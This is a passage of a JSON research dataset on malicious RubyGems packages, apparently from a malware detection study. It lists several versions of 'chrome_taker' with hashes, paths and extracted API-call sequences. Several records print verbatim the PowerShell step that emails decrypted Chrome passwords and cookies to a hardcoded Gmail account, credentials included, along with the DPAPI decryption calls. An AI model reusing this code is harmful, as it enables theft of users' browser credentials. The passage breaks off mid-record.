 \".+', 'row.[](13).to_s', 'row.[]', 'f.write', '\"Uname:     \" + row.[](3).to_s.+', '\"Uname:     \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Pass:      \".+', 'DpApi.decrypt(row.[](5)).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close']",
            "n_tokens": 1345,
            "embedding": "[-0.0129592  -0.01820544 -0.00246672 ... -0.00846817 -0.02232557\n -0.00555011]",
            "cluster": "0",
            "id": 577,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/0.0.0/chrome_taker-0.0.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/0.0.0/chrome_taker-0.0.0_extracted",
            "name": "chrome_taker",
            "version": "0.0.0",
            "published_at": "2019-05-12T02:37:36.680Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": NaN,
            "SHA-256": "66270c59ba997ca2dc3e1597063fc778273ce0576cf6103fb53d1355ae103185"
        },
        {
            "name_version": "chrome_taker-1.0.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/1.0.0/chrome_taker-1.0.0_extracted/chrome_taker-1.0.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require_relative', 'require_relative', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Object.const_defined?', 'exit', 'Gem.win_platform?', 'Plugins.create_home_dir', 'Plugins.steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.export_data', 'Plugins.gone_like_the_wind', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"HostKey: \" + row.[](0).to_s.+', '\"HostKey: \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"Path:    \" + row.[](1).to_s.+', '\"Path:    \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"Secure:  \" + row.[](2).to_s.+', '\"Secure:  \".+', 'row.[](2).to_s', 'row.[]', 'f.write', '\"Expire:  \" + row.[](3).to_s.+', '\"Expire:  \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Name:    \" + row.[](4).to_s.+', '\"Name:    \".+', 'row.[](4).to_s', 'row.[]', 'f.write', '\"Value:   \".+', 'DpApi.decrypt(row.[](\"encrypted_value\")).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"OrginUrl:  \" + row.[](0).to_s.+', '\"OrginUrl:  \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"ActionUrl: \" + row.[](1).to_s.+', '\"ActionUrl: \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"PassType:  \" + row.[](12).to_s.+', '\"PassType:  \".+', 'row.[](12).to_s', 'row.[]', 'f.write', '\"Date:      \" + row.[](10).to_s.+', '\"Date:      \".+', 'row.[](10).to_s', 'row.[]', 'f.write', '\"TimeUsed   \" + row.[](13).to_s.+', '\"TimeUsed   \".+', 'row.[](13).to_s', 'row.[]', 'f.write', '\"Uname:     \" + row.[](3).to_s.+', '\"Uname:     \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Pass:      \".+', 'DpApi.decrypt(row.[](5)).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close']",
            "n_tokens": 1353,
            "embedding": "[-0.01239445 -0.01769123 -0.00189139 ... -0.00747287 -0.02378252\n -0.00337449]",
            "cluster": "0",
            "id": 576,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/1.0.0/chrome_taker-1.0.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/1.0.0/chrome_taker-1.0.0_extracted",
            "name": "chrome_taker",
            "version": "1.0.0",
            "published_at": "2019-05-12T02:44:19.002Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": NaN,
            "SHA-256": "0c04a0c6fd261895ed71e94f814c183f6f9e2b10ad26092405ca411931ba4bd0"
        },
        {
            "name_version": "chrome_taker-2.0.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/2.0.0/chrome_taker-2.0.0_extracted/chrome_taker-2.0.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require_relative', 'require_relative', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Object.const_defined?', 'exit', 'Gem.win_platform?', 'Plugins.create_home_dir', 'Plugins.steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.export_data', 'Plugins.gone_like_the_wind', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"HostKey: \" + row.[](0).to_s.+', '\"HostKey: \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"Path:    \" + row.[](1).to_s.+', '\"Path:    \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"Secure:  \" + row.[](2).to_s.+', '\"Secure:  \".+', 'row.[](2).to_s', 'row.[]', 'f.write', '\"Expire:  \" + row.[](3).to_s.+', '\"Expire:  \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Name:    \" + row.[](4).to_s.+', '\"Name:    \".+', 'row.[](4).to_s', 'row.[]', 'f.write', '\"Value:   \".+', 'DpApi.decrypt(row.[](\"encrypted_value\")).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"OrginUrl:  \" + row.[](0).to_s.+', '\"OrginUrl:  \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"ActionUrl: \" + row.[](1).to_s.+', '\"ActionUrl: \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"PassType:  \" + row.[](12).to_s.+', '\"PassType:  \".+', 'row.[](12).to_s', 'row.[]', 'f.write', '\"Date:      \" + row.[](10).to_s.+', '\"Date:      \".+', 'row.[](10).to_s', 'row.[]', 'f.write', '\"TimeUsed   \" + row.[](13).to_s.+', '\"TimeUsed   \".+', 'row.[](13).to_s', 'row.[]', 'f.write', '\"Uname:     \" + row.[](3).to_s.+', '\"Uname:     \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Pass:      \".+', 'DpApi.decrypt(row.[](5)).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close']",
            "n_tokens": 1353,
            "embedding": "[-0.0123556  -0.01767611 -0.00170464 ... -0.00745048 -0.02373901\n -0.00330764]",
            "cluster": "0",
            "id": 578,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/2.0.0/chrome_taker-2.0.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/2.0.0/chrome_taker-2.0.0_extracted",
            "name": "chrome_taker",
            "version": "2.0.0",
            "published_at": "2019-05-12T02:49:50.216Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": NaN,
            "SHA-256": "0c04a0c6fd261895ed71e94f814c183f6f9e2b10ad26092405ca411931ba4bd0"
        },
        {
            "name_version": "chrome_taker-4.0.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/4.0.0/chrome_taker-4.0.0_extracted/chrome_taker-4.0.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"HostKey: \" + row.[](0).to_s.+', '\"HostKey: \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"Path:    \" + row.[](1).to_s.+', '\"Path:    \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"Secure:  \" + row.[](2).to_s.+', '\"Secure:  \".+', 'row.[](2).to_s', 'row.[]', 'f.write', '\"Expire:  \" + row.[](3).to_s.+', '\"Expire:  \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Name:    \" + row.[](4).to_s.+', '\"Name:    \".+', 'row.[](4).to_s', 'row.[]', 'f.write', '\"Value:   \".+', 'DpApi.decrypt(row.[](\"encrypted_value\")).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"OrginUrl:  \" + row.[](0).to_s.+', '\"OrginUrl:  \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"ActionUrl: \" + row.[](1).to_s.+', '\"ActionUrl: \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"PassType:  \" + row.[](12).to_s.+', '\"PassType:  \".+', 'row.[](12).to_s', 'row.[]', 'f.write', '\"Date:      \" + row.[](10).to_s.+', '\"Date:      \".+', 'row.[](10).to_s', 'row.[]', 'f.write', '\"TimeUsed   \" + row.[](13).to_s.+', '\"TimeUsed   \".+', 'row.[](13).to_s', 'row.[]', 'f.write', '\"Uname:     \" + row.[](3).to_s.+', '\"Uname:     \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Pass:      \".+', 'DpApi.decrypt(row.[](5)).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close']",
            "n_tokens": 1238,
            "embedding": "[-0.0086494  -0.01582307 -0.00020809 ... -0.0086995  -0.01909335\n -0.0048781 ]",
            "cluster": "0",
            "id": 575,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/4.0.0/chrome_taker-4.0.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/4.0.0/chrome_taker-4.0.0_extracted",
            "name": "chrome_taker",
            "version": "4.0.0",
            "published_at": "2019-05-12T02:59:14.321Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": NaN,
            "SHA-256": "559798a28b0c124260a7b235528bf942141bb8c8f349e1216f096ce5b18e95e4"
        },
        {
            "name_version": "chrome_taker-1.7.9",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/1.7.9/chrome_taker-1.7.9_extracted/chrome_taker-1.7.9_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Gem.win_platform?', 'ChromeTaker.create_home_dir', 'ChromeTaker.steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'ChromeTaker.steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'ChromeTaker.create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'ChromeTaker.export_data', 'ChromeTaker.gone_like_the_wind', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Gem.win_platform?', 'Plugins.create_home_dir', 'Plugins.steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.export_data', 'Plugins.gone_like_the_wind', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"HostKey: \" + row.[](0).to_s.+', '\"HostKey: \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"Path:    \" + row.[](1).to_s.+', '\"Path:    \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"Secure:  \" + row.[](2).to_s.+', '\"Secure:  \".+', 'row.[](2).to_s', 'row.[]', 'f.write', '\"Expire:  \" + row.[](3).to_s.+', '\"Expire:  \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Name:    \" + row.[](4).to_s.+', '\"Name:    \".+', 'row.[](4).to_s', 'row.[]', 'f.write', '\"Value:   \".+', 'DpApi.decrypt(row.[](\"encrypted_value\")).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"OrginUrl:  \" + row.[](0).to_s.+', '\"OrginUrl:  \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"ActionUrl: \" + row.[](1).to_s.+', '\"ActionUrl: \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"PassType:  \" + row.[](12).to_s.+', '\"PassType:  \".+', 'row.[](12).to_s', 'row.[]', 'f.write', '\"Date:      \" + row.[](10).to_s.+', '\"Date:      \".+', 'row.[](10).to_s', 'row.[]', 'f.write', '\"TimeUsed   \" + row.[](13).to_s.+', '\"TimeUsed   \".+', 'row.[](13).to_s', 'row.[]', 'f.write', '\"Uname:     \" + row.[](3).to_s.+', '\"Uname:     \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Pass:      \".+', 'DpApi.decrypt(row.[](5)).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close']",
            "n_tokens": 2029,
            "embedding": "[-0.00669389 -0.02156976 -0.00814759 ... -0.00852084 -0.02608802\n -0.0024126 ]",
            "cluster": "0",
            "id": 574,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/1.7.9/chrome_taker-1.7.9.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/1.7.9/chrome_taker-1.7.9_extracted",
            "name": "chrome_taker",
            "version": "1.7.9",
            "published_at": "2019-05-12T16:50:12.807Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake",
            "SHA-256": "02b65f27f10e905faa1c7635e6d43c7af2a22624126b8b05f3901a3f73aefd12"
        },
        {
            "name_version": "chrome_taker-1.8.9",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/1.8.9/chrome_taker-1.8.9_extracted/chrome_taker-1.8.9_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = 